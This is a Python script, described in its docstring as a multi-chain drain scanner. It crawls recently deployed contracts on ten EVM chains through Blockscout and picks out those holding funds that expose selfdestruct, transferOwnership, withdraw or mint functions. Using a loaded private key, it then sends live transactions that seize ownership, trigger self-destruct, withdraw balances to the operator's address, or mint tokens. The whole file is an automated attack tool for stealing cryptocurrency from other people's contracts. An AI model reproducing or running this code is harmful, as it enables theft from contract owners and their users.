#!/usr/bin/env python3
"""Multi-chain drain scanner — scan Blockscout on ALL EVM chains, drain vulnerable contracts with balance."""
import logging
import time
import tomllib
from src.rpc import RpcClient
from src.sources.blockscout import BlockscoutRecentSource
from src.types import Chain, ContractTarget
from src.signer import load_evm_private_key, get_receive_address
from src.evmole_utils import get_functions, get_selectors
from src.evm.disassembler import disassemble

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")
logger = logging.getLogger("multidrain")

# EIP-6780: SELFDESTRUCT broken on Ethereum post-Dencun (March 2024)
# Still works on most L2s
SELFDESTRUCT_BROKEN = {Chain.ETHEREUM}
# Additionally, ZKSync and Linea may have different EVM behavior
# BSC, Arbitrum, Base, Polygon, Avalanche, Optimism, Scroll still support it

CHAIN_IDS = {
    Chain.ETHEREUM: 1, Chain.BSC: 56, Chain.ARBITRUM: 42161,
    Chain.BASE: 8453, Chain.POLYGON: 137, Chain.AVALANCHE: 43114,
    Chain.OPTIMISM: 10, Chain.ZKSYNC: 324, Chain.LINEA: 59144,
    Chain.SCROLL: 534352,
}

ALL_CHAINS = list(CHAIN_IDS.keys())


def load_rpc_config():
    with open("config.toml", "rb") as f:
        return tomllib.load(f).get("rpc", {})


def get_eth_balance(rpc: RpcClient, addr: str) -> float:
    try:
        raw = rpc.call("eth_getBalance", [addr, "latest"])
        bal = int(raw.get("result", "0x0"), 16) if isinstance(raw, dict) else int(raw, 16)
        return bal / 10**18
    except Exception:
        return 0.0


def get_code(rpc: RpcClient, addr: str) -> str:
    raw = rpc.call("eth_getCode", [addr, "latest"])
    code = raw.get("result", "") if isinstance(raw, dict) else str(raw)
    return code


def send_tx(rpc: RpcClient, signer, to_addr: str, data: str, chain_id: int) -> dict:
    nonce_raw = rpc.call("eth_getTransactionCount", [signer.address, "pending"])
    nonce = int(nonce_raw.get("result", "0x0"), 16) if isinstance(nonce_raw, dict) else int(nonce_raw, 16)
    gas_raw = rpc.call("eth_gasPrice", [])
    gas_price = int(gas_raw.get("result", "0x0"), 16) if isinstance(gas_raw, dict) else int(gas_raw, 16)
    gas_price = max(gas_price, 1_000_000_000)

    tx = {
        "from": signer.address, "to": to_addr, "data": data, "value": 0,
        "nonce": nonce, "gasPrice": gas_price, "chainId": chain_id,
    }
    try:
        gas_est = rpc.call("eth_estimateGas", [{
            "from": signer.address, "to": to_addr, "data": data,
        }])
        gas = int(gas_est.get("result", "0x493e0"), 16) if isinstance(gas_est, dict) else 300000
        tx["gas"] = min(int(gas * 1.5), 1_500_000)
    except Exception as e:
        tx["gas"] = 500000
        logger.warning("Gas estimate failed %s: %s", to_addr, e)

    try:
        signed = signer.sign_transaction(tx)
        raw_tx = signed.raw_transaction.hex()
        result = rpc.call("eth_sendRawTransaction", [raw_tx])
        tx_hash = result.get("result", "") if isinstance(result, dict) else str(result)
        if tx_hash:
            logger.info("TX: %s → %s (chain %d)", str(tx_hash)[:20], to_addr, chain_id)
            return {"success": True, "tx_hash": str(tx_hash), "to": to_addr}
        return {"success": False, "error": "Empty hash", "to": to_addr}
    except Exception as e:
        logger.error("Send failed %s on chain %d: %s", to_addr, chain_id, e)
        return {"success": False, "error": str(e), "to": to_addr}


def drain_selfdestruct(rpc, signer, addr, code, chain, chain_id):
    """Try all zero-arg non-view functions — one of them is kill()."""
    functions = get_functions(code)
    for fn in functions:
        if fn.arguments == "" and fn.state_mutability in ("nonpayable", "payable"):
            logger.info("  Selfdestruct: trying 0x%s on %s", fn.selector, addr)
            result = send_tx(rpc, signer, addr, "0x" + fn.selector, chain_id)
            if result["success"]:
                time.sleep(3)
                new_bal = get_eth_balance(rpc, addr)
                logger.info("  Balance after: %.6f ETH", new_bal)
                return result
    logger.warning("  No zero-arg function found for selfdestruct on %s", addr)
    return {"success": False, "error": "No zero-arg fn", "to": addr}


def drain_transfer_ownership(rpc, signer, addr, selectors, chain_id, receive):
    """Step 1: transferOwnership to signer. Step 2: withdraw/sweep to receive."""
    logger.info("  Step 1: transferOwnership → signer")
    data = "0xf2fde38b" + signer.address[2:].zfill(64)
    r1 = send_tx(rpc, signer, addr, data, chain_id)
    if not r1["success"]:
        return r1
    time.sleep(3)

    # Step 2: try withdraw/sweep functions
    withdraw_selectors = ["2e1a7d4d", "6198e339", "00f714ce", "db66042c",
                           "b36a7c65", "d0679d34", "21df0da7", "b69ef8a8",
                           "811c39ab", "7c71ef48", "278d88cf", "b20d30a9",
                           "797af627", "cbf0b0c0", "f00d4b5d"]
    for sel in withdraw_selectors:
        if sel in selectors:
            if sel == "db66042c":  # withdrawAll()
                data2 = "0x" + sel
            elif sel == "2e1a7d4d":  # withdraw(uint256)
                data2 = "0x" + sel + "0" * 64  # amount=0 → withdraw all
            else:
                data2 = "0x" + sel + receive[2:].zfill(64)
            logger.info("  Step 2: calling 0x%s", sel)
            r2 = send_tx(rpc, signer, addr, data2, chain_id)
            if r2["success"]:
                time.sleep(2)
            break
    return {"success": True, "to": addr}


def drain_mint(rpc, signer, addr, selectors, chain_id, receive):
    if "40c10f19" in selectors:
        amount = "0x" + format(1_000_000 * 10**18, "064x")
        data = "0x40c10f19" + signer.address[2:].zfill(64) + amount[2:]
        return send_tx(rpc, signer, addr, data, chain_id)
    return {"success": False, "error": "No mint", "to": addr}


def scan_chain(chain: Chain, rpc_url: str, signer, receive: str) -> list:
    """Scan single chain for drainable contracts."""
    chain_name = chain.name.lower()
    selfdestruct_works = chain not in SELFDESTRUCT_BROKEN
    logger.info("=== Scanning %s (SELFDESTRUCT: %s) ===", chain_name, "WORKS" if selfdestruct_works else "BROKEN")

    rpc = RpcClient(rpc_url)
    source = BlockscoutRecentSource(max_pages=10)
    contracts = source.fetch(chain)
    chain_id = CHAIN_IDS.get(chain, 1)

    drainable = []
    for i, ct in enumerate(contracts):
        addr = ct.address
        bal = get_eth_balance(rpc, addr)
        if bal < 0.0003:
            continue

        code = get_code(rpc, addr)
        if not code or code in ("0x", "0x0"):
            continue

        selectors = get_selectors(code)
        try:
            has_sd = any(inst.name == "SELFDESTRUCT" for inst in disassemble(code))
        except Exception:
            has_sd = False

        vulns = []
        vuln_types = []
        if has_sd and selfdestruct_works:
            vulns.append("selfdestruct")
            vuln_types.append("SD")
        if "f2fde38b" in selectors:
            vulns.append("transferOwnership")
            vuln_types.append("TOS")
            # Also check if there's a payable withdraw function
            for ws in ["2e1a7d4d", "db66042c", "00f714ce", "6198e339", "797af627", "b20d30a9"]:
                if ws in selectors:
                    vulns.append("withdraw")
                    vuln_types.append("WD")
                    break
        if "40c10f19" in selectors and bal > 0.001:
            vulns.append("mint")
            vuln_types.append("MINT")

        if vulns:
            drainable.append((addr, bal, vulns, vuln_types, code, selectors, chain, chain_id))
            logger.info("  %s (%s) | %.4f ETH | %s", addr[:10], chain_name, bal, "+".join(vuln_types))

        if (i + 1) % 200 == 0:
            logger.info("  Scanned %d/%d on %s, %d findings", i + 1, len(contracts), chain_name, len(drainable))

    logger.info("=== %s done: %d drainable contracts ===", chain_name, len(drainable))
    return drainable


def main():
    rpc_cfg = load_rpc_config()
    signer = load_evm_private_key()
    if not signer:
        logger.error("No private key — set EVM_PRIVATE_KEY or config.toml [executor]")
        return
    receive = get_receive_address(Chain.ETHEREUM) or signer.address
    logger.info("Signer: %s | Receive: %s", signer.address, receive)

    # Check signer balance on each chain
    for chain in ALL_CHAINS:
        rpc_url = rpc_cfg.get(chain.name.lower(), "")
        if not rpc_url:
            continue
        rpc = RpcClient(rpc_url)
        bal = get_eth_balance(rpc, signer.address)
        logger.info("Signer on %s: %.6f ETH", chain.name.lower(), bal)
        if bal < 0.002:
            logger.warning("  ⚠️ Low gas on %s — skipping", chain.name.lower())

    # Scan all chains
    all_findings = []
    for chain in ALL_CHAINS:
        rpc_url = rpc_cfg.get(chain.name.lower(), "")
        if not rpc_url:
            logger.warning("No RPC for %s, skipping", chain.name.lower())
            continue
        try:
            findings = scan_chain(chain, rpc_url, signer, receive)
            all_findings.extend(findings)
        except Exception as e:
            logger.error("Scan failed on %s: %s", chain.name.lower(), e)

    logger.info("=" * 60)
    logger.info("TOTAL FINDINGS ACROSS ALL CHAINS: %d", len(all_findings))
    for addr, bal, vulns, vt, code, sel, chain, cid in all_findings:
        logger.info("  %s | %s | %.4f ETH | %s", addr[:10], chain.name.lower(), bal, "+".join(vt))

    # Drain
    logger.info("=" * 60)
    logger.info("STARTING DRAIN")

    for addr, bal, vulns, vt, code, selectors, chain, chain_id in all_findings:
        rpc_url = rpc_cfg.get(chain.name.lower(), "")
        if not rpc_url:
            continue
        rpc = RpcClient(rpc_url)
        receive = get_receive_address(chain) or signer.address

        bal_before = get_eth_balance(rpc, addr)
        logger.info("--- %s (%s) %.4f ETH [%s] ---", addr[:10], chain.name.lower(), bal_before, "+".join(vt))

        if "transferOwnership" in vulns:
            drain_transfer_ownership(rpc, signer, addr, selectors, chain_id, receive)
        elif "selfdestruct" in vulns:
            drain_selfdestruct(rpc, signer, addr, code, chain, chain_id)

        if "mint" in vulns:
            drain_mint(rpc, signer, addr, selectors, chain_id, receive)

        time.sleep(1)

    logger.info("=" * 60)
    logger.info("DONE")


if __name__ == "__main__":
    main()
